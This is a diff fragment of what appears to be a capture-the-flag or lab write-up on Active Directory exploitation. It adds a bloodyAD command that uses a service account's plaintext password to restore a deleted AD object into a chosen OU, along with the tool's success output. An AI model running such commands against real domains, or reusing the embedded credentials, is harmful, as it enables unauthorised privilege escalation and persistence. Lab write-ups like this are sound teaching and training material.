@@ -747,5 +747,10 @@ Using these privs i might be able to restore the object into the `OU=Legacy Serv
 # Restoring `svc_dcsecure_core`
 
 ```python
+bloodyAD --host dc01.trask.hsm -d trask.hsm -u 'svc_dcsecure_agent' -p 'DCiZS3CureD1982#' -k set restore --newParent 'OU=Legacy Service Compatible Access,DC=trask,DC=hsm' 'CN=svc_dcsecure_core\0ADEL:a2b4e839-17b0-4798-a92d-59a65a347754,CN=Deleted Objects,DC=trask,DC=hsm'
 
+[+] CN=svc_dcsecure_core\0ADEL:a2b4e839-17b0-4798-a92d-59a65a347754,CN=Deleted Objects,DC=trask,DC=hsm has been restored successfully under CN=svc_dcsecure_core,OU=Legacy Service Compatible Access,DC=trask,DC=hsm
 ```
+
+I have now restored the object under that OU 
+
